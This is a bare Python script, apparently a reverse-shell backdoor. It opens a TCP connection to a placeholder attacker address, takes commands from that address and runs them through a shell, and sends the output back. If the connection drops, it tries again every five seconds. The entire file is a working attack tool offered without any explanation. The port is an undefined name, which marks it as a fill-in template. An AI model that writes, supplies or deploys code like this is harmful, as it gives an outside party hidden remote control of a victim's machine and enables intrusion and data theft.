import socket
import subprocess
import time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('attacker_ip', attacker_port))
    return s

def shell(s):
    while True:
        command = s.recv(1024).decode('utf-8')
        if 'exit' in command:
            s.close()
            break
        else:
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(output.stdout.read())
            s.send(output.stderr.read())

def main():
    while True:
        try:
            s = connect()
            shell(s)
        except:
            time.sleep(5)
            continue

if __name__ == '__main__':
    main()
